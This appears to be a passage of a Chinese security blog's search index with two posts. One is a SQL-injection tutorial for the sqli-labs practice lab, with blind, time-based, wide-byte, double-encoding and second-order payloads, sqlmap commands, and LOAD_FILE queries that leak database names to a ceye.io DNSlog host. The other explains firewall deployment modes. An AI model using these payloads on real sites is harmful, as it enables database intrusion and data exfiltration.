align="center">left()函数</td><td align="center">left(database(),1)&gt;’s’ //判断 database()的前一位是否大于’s’<br>database()显示数据库名称，left(a,b)从左侧截取 a 的前 b 位</td></tr><tr><td align="center">2</td><td align="center">regexp</td><td align="center">select user() regexp ‘^r’ //判断 user()的头位置是否为’r’<br>正则表达式的用法，user()结果为 root,regexp 为匹配 root 的正则表达式</td></tr><tr><td align="center">3</td><td align="center">like</td><td align="center">select user() like ‘ro%’<br>与 regexp 类似，使用 like 进行匹配</td></tr><tr><td align="center">4</td><td align="center">substr()函数<br>ascii()函数</td><td align="center">ascii(substr((select database()),1,1))≠98<br>substr(a,b,c)从 b 位置开始，截取字符串 a 的 c 长度，ascii()将字符转换为 ascii 值</td></tr><tr><td align="center">5</td><td align="center">ord()函数<br>mid()函数</td><td align="center">ord(mid((select user()),1,1))=114<br>mid(a,b,c)从位置 b 开始，截取 a 字符串的 c 位 ord()函数通 ascii，将字符转为 ascii 值</td></tr></tbody></table><h5 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h5><h6 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h6><blockquote><p>代码存在 SQL 注入漏洞，然而页面不会回显数据，也不会回显错误信息；</p><p>语句执行后也不知道真假，我们不能通过页面返回的内容来进行判断；</p><p>可以构造语句，通过页面响应的市场，来判断信息，这就是时间盲注</p></blockquote><h6 id="时间盲注的方法"><a href="#时间盲注的方法" class="headerlink" title="时间盲注的方法"></a>时间盲注的方法</h6><blockquote><p>构造逻辑语句，通过条件语句进行判断，为真立刻执行，否则延时执行</p></blockquote><table><thead><tr><th align="center">核心语法</th><th align="center">真实场景</th></tr></thead><tbody><tr><td align="center">if(left(user(),1)=’a’,0,sleep(3))</td><td align="center">if(ascii(substr(user(),1,1))&gt;115,0,sleep(2))%23</td></tr></tbody></table><h5 id="Dnslog-盲注"><a href="#Dnslog-盲注" class="headerlink" title="Dnslog 盲注"></a>Dnslog 盲注</h5><blockquote><p>代码存在 SQL 注入漏洞，然而页面既不会回显数据，也不会显示错误显示；</p><p>我们通过布尔或者时间盲注可以获取到内容，但是整个过程效率较低，需要发送很多的请求进行判断，很肯能会出发安全设备的防护；</p><p>我们需要一种方式，减少请求 ，直接回显数据，这里可以使用 Dnslog 实现注入。</p><p>Dnslog 平台：<a href="http://ceye.io/">http://ceye.io</a></p></blockquote><h6 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h6><p>DNS 在解析的时候回留下日志 ，通过读取多级域名的解析日志，获取请求信息。</p><p>MySql LOAD_FILE 函数可以发起请求：</p><p>SELECT LOAD_FILE(CONCAT(‘\\‘,’test’,’.mysql.6pd3g5.ceye.io\abc’));</p><h6 id="Dnslog-盲注方法"><a href="#Dnslog-盲注方法" class="headerlink" title="Dnslog 盲注方法"></a>Dnslog 盲注方法</h6><p>构造语句，利用 load_file()函数发起请求，使用 Dnslog 接收请求，获取数据</p><p>Tips：目标服务器必须是 Windows，应为 LOAD_FILE 函数不能运行在 Linux 下。</p><p>通过 SQL 语句查询内容，作为请求的一部分，发送至 Dnslog;</p><p>只要对这一部分的语句进行构造，就能实现有回显的 SQL 注入;</p><p>值得注意的是，这些数据格式和内容队友限制（:,~,@），需要进行一些处理。</p><pre class="line-numbers language-none"><code class="language-none">#sqlilabs环境下：http://127.0.0.1/sqlilabs/Less-1/?id=1' and if((SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.6pd3g5.ceye.io\\abc'))),1,1)--+#navicat环境下：SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.6pd3g5.ceye.io\\abc'));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h4><p>字符大小为一个字节就为窄字节</p><p>字符大小为两个字节就位宽字节</p><p>宽字节：GB2312、GBK、GB18030、BIG5、Shift_JIS 等这些都是常说的宽字节，实际为两字节。</p><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><p>使用 UTF-8，避免宽字节注入；</p><ol><li>ps：不仅在 gbk、韩文、日文等等都是宽字节，都有可能存在宽字节注入漏洞</li><li>mysql_real_escape_string,mysql_set_charset(‘gbk’,$conn)；</li><li>可以设置参数，character_set_client=binary,<br>例如$result=mysql_query(“character_set_client=binary”,$sql)；</li></ol><h5 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h5><pre class="line-numbers language-none"><code class="language-none">输入    处理     编码      带入SQL '    \'      %5c%27 \'   id=1\' and    &gt;&gt;不能注入 //MySQL在使用GBK编码的时候，会认为两个字符为一个函数 %df    %df\'   %df%5c%27 啊'   id=啊' and  &gt;&gt;可以注入 两个字符组合，认为是一个汉字 注：前一个ASCII码大于128才能到汉字的范围<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="方法-1"><a href="#方法-1" class="headerlink" title="方法"></a>方法</h5><p>在注入点后键入%df，然后按照正常的流程开始注入</p><p>sqlilabs-less-32（测试环境）</p><h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><h6 id="手工"><a href="#手工" class="headerlink" title="手工"></a>手工</h6><pre class="line-numbers language-none"><code class="language-none">//黑盒测试在可能的注入点后键入%df，之后进行注入测试//白盒测试1.查看MySQL编码是否为GBK2.是否使用preg_replace把单引号替换成\'3.是否使用addslashes进行转义4.是否使用mysql_real_escape_string进行转义<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h6><pre class="line-numbers language-none"><code class="language-none">//在参数id=1后加%dfpython sqlmap.py -u http://localhost/sqlilabs/Less-32/?id=1%df<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="二次编码注入"><a href="#二次编码注入" class="headerlink" title="二次编码注入"></a>二次编码注入</h4><p>为什么要编码？</p><p>e.g.</p><p>?id=1&amp;username=admin&amp;passwd=admin</p><p>假如用户的 username 中存在&amp;、？就会和 URL 冲突</p><blockquote><p>宽字节注入和二次注入都是在面对 PHP 代码或配置，对输入的’(单引号)进行转义的时候，在处理用户输入数据是存在问题，可绕过转义。</p></blockquote><h5 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h5><p>urlencode()与 PHP 本身编码时，两者配合失误，构造数据消灭\</p><pre class="line-numbers language-none"><code class="language-none">用户输入PHP自身编码   转义   带入SQLid=1%27      id=1'      id=1\'     id=1\' and  &lt;&lt;不能注入用户输入     PHP自身编码   转义     函数编码   带入SQLid=1%2527   id=1%27    id=1%27    id=1'    id=1' and    &lt;&lt;可以注入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="注入-1"><a href="#注入-1" class="headerlink" title="注入"></a>注入</h5><h6 id="手工-1"><a href="#手工-1" class="headerlink" title="手工"></a>手工</h6><pre class="line-numbers language-none"><code class="language-none">//黑盒测试在可能的注入点后键入%2527，之后进行注入测试?id=1%2527//白盒测试1.是否使用户urldecode2.urldecode函数是否在转义的方法之后<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="sqlmap-1"><a href="#sqlmap-1" class="headerlink" title="sqlmap"></a>sqlmap</h6><p>python sqlmap.py -u <a href="http://localhost/sqlilabs/Less-32/?id=1%2527">http://localhost/sqlilabs/Less-32/?id=1%2527</a></p><h4 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h4><h5 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h5><ol><li><p>插入恶意数据</p><blockquote><p>第一次进行数据库插入数据的时候，仅仅对其中的特殊字符进行了转义，在写入数据库的时候还保留了原来的数据，但是数据本身包含恶意内容。</p></blockquote></li><li><p>引用恶意数据</p><blockquote><p>在将数据存入到数据库之后，开发者就认为数据是可信的。在下一次需要进行查询的时候，直接从数据库中取出了恶意数据，没有进行进一步的检验和处理，这样就会造成 SQL 的二次注入。</p></blockquote></li></ol><p>示意图</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%9B%BE.png"></p><p>练习</p><p>sqlilabs-less-24</p><h5 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h5><blockquote><p>对外部提交的数据，需要更加谨慎的对待。</p><p>程序内部的数据调用，也要更严格的进行检查，一旦不小心，测试者就能将特定的 SQL 语句带入到查询当中。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>防火墙的部署模式</title>
      <link href="2021/03/17/fang-huo-qiang-de-bu-shu-mo-shi/"/>
      <url>2021/03/17/fang-huo-qiang-de-bu-shu-mo-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="防火墙的部署模式"><a href="#防火墙的部署模式" class="headerlink" title="防火墙的部署模式"></a>防火墙的部署模式</h1><h2 id="路由模式"><a href="#路由模式" class="headerlink" title="路由模式"></a>路由模式</h2><p>当防火墙位于内部网络和外部网络之间时，需要将防火墙与内部网络、外部网络以及DMZ 三个区域相连的接口分别配置成不同网段的IP 地址，重新规划原有的网络拓扑，此时相当于一台路由器。</p><p>如下图所示，防火墙的Trust区域接口与公司内部网络相连，Untrust 区域接口与外部网络相连。值得注意的是，Trust 区域接口和Untrust 区域接口分别处于两个不同的子网中。</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/eb9990aba95143e8ada4de538a4a08c5.jpg"></p><p>采用路由模式时，可以完成ACL 包过滤、ASPF 动态过滤、NAT 转换等功能。然而，路由模式需要对网络拓扑进行修改（内部网络用户需要更改网关、路由器需要更改路由配置等），这是一件相当费事的工作，因此在使用该模式时需权衡利弊。</p><h2 id="透明模式"><a href="#透明模式" class="headerlink" title="透明模式"></a>透明模式</h2><p>如果防火墙采用透明模式进行工作，则可以避免改变拓扑结构造成的麻烦，此时防火墙对于子网用户和路由器来说是完全透明的。也就是说，用户完全感觉不到防火墙的存在。</p><p>采用透明模式时，只需在网络中像放置网桥（bridge）一样插入该防火墙设备即可，无需修改任何已有的配置。与路由模式相同，IP 报文同样经过相关的过滤检查（但是IP 报文中的源或目的地址不会改变），内部网络用户依旧受到防火墙的保护。防火墙透明模式的典型组网方式如下：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/816b8dac680b97a4067dd27745e1d8f9.jpg"></p><p>如上图所示，防火墙的Trust 区域接口与公司内部网络相连，Untrust 区域接口与外部网络相连，需要注意的是内部网络和外部网络必须处于同一个子网。</p><h2 id="混合模式"><a href="#混合模式" class="headerlink" title="混合模式"></a>混合模式</h2><p>如果防火墙既存在工作在路由模式的接口（接口具有IP 地址），又存在工作在透明模式的接口（接口无IP  地址），则防火墙工作在混合模式下。混合模式主要用于透明模式作双机备份的情况，此时启动VRRP（Virtual Router Redundancy Protocol，虚拟路由冗余协议）功能的接口需要配置IP 地址，其它接口不配置IP地址。</p><p>防火墙混合模式的典型组网方式如下：</p><p><img src="https://github.com/southerose/PictureBed/raw/master/img/9ceb6b1ba98ac62b49a8fcff828cf393.jpg"></p><p>如上图所示，主/备 防火墙的Trust 区域接口与公司内部网络相连，Untrust区域接口与外部网络相连，主/备防火墙之间通过HUB 或LAN Switch 实现互相连接，并运行VRRP 协议进行备份。需要注意的是内部网络和外部网络必须处于同一个子网。</p><h1 id="防火墙的部署方法"><a href="#防火墙的部署方法" class="headerlink" title="防火墙的部署方法"></a>防火墙的部署方法</h1><h2 id="包过滤路由器"><a href="#包过滤路由器" class="headerlink" title="包过滤路由器"></a>包过滤路由器</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210126140245738.png"></p><h3 id="包过滤防火墙功能的路由器"><a href="#包过滤防火墙功能的路由器" class="headerlink" title="包过滤防火墙功能的路由器"></a>包过滤防火墙功能的路由器</h3><ul><li>内网与外网的唯一连接点</li><li>路由+ACL </li></ul><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><ul><li><p>成本低</p></li><li><p>易于使用</p></li></ul><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ul><li><p>路由器被攻破，内网完全暴露</p></li><li><p>内部信息对外公开，可攻击开放的服务和主机</p></li></ul><h2 id="双宿主堡垒机"><a href="#双宿主堡垒机" class="headerlink" title="双宿主堡垒机"></a>双宿主堡垒机</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210126140311802.png"></p><h3 id="使用应用代理网关作为双宿主堡垒主机"><a href="#使用应用代理网关作为双宿主堡垒主机" class="headerlink" title="使用应用代理网关作为双宿主堡垒主机"></a>使用应用代理网关作为双宿主堡垒主机</h3><ul><li><p>一个网卡使用公网ip地址连接外部网络</p></li><li><p>一个网卡使用私有ip地址连接内部网络</p></li><li><p>由应用的代理服务器为特定的网络应用提供代理</p></li></ul><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ul><li>对外屏蔽内网信息、用户级身份认证和行为审计</li></ul><h3 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h3><ul><li>内网对外访问过于严格</li><li>一旦堡垒主机被攻破，内网完全暴露</li></ul><h2 id="屏蔽主机"><a href="#屏蔽主机" class="headerlink" title="屏蔽主机"></a>屏蔽主机</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210126141121714.png"></p><h3 id="结合包过滤防火墙和应用层代理"><a href="#结合包过滤防火墙和应用层代理" class="headerlink" title="结合包过滤防火墙和应用层代理"></a>结合包过滤防火墙和应用层代理</h3><ul><li>两层安全防护</li><li>包过滤防火墙：网络层的访问控制</li><li>应用层代理堡垒主机：进行应用安全控制</li></ul><h3 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h3><ul><li>双重安全可靠设计</li></ul><h3 id="缺点-2"><a href="#缺点-2" class="headerlink" title="缺点"></a>缺点</h3><ul><li>对外开放服务器成弱点</li></ul><h2 id="屏蔽子网"><a href="#屏蔽子网" class="headerlink" title="屏蔽子网"></a>屏蔽子网</h2><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210126141622159.png"></p><h3 id="屏蔽子网：DMZ区"><a href="#屏蔽子网：DMZ区" class="headerlink" title="屏蔽子网：DMZ区"></a>屏蔽子网：DMZ区</h3><ul><li>应用代理及对外服务器</li><li>三层安全防护：外网防火墙，应用层代理，内网防火墙</li></ul><h2 id="防火墙部署结构"><a href="#防火墙部署结构" class="headerlink" title="防火墙部署结构"></a>防火墙部署结构</h2><ul><li>可信网络与不可信网络之间</li><li>不同安全级别的网络之间</li><li>两个需要隔离的区域之间</li></ul><h2 id="防火墙的部署方式"><a href="#防火墙的部署方式" class="headerlink" title="防火墙的部署方式"></a>防火墙的部署方式</h2><h3 id="单防火墙部署方式（有DMZ-）"><a href="#单防火墙部署方式（有DMZ-）" class="headerlink" title="单防火墙部署方式（有DMZ ）"></a>单防火墙部署方式（有DMZ ）</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210126142555476.png"></p><h3 id="单防火墙部署方式（无DMZ-）"><a href="#单防火墙部署方式（无DMZ-）" class="headerlink" title="单防火墙部署方式（无DMZ ）"></a>单防火墙部署方式（无DMZ ）</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/src=http---5b0988e595225.cdn.sohucs.com-images-20171115-e8707f75463f43c483ca1b1a682d8343.jpeg&amp;refer=http---5b0988e595225.cdn.sohucs.jpg"></p><h3 id="双防火墙部署方式"><a href="#双防火墙部署方式" class="headerlink" title="双防火墙部署方式"></a>双防火墙部署方式</h3><p><img src="https://github.com/southerose/PictureBed/raw/master/img/image-20210126142609701.png"></p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 设备 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
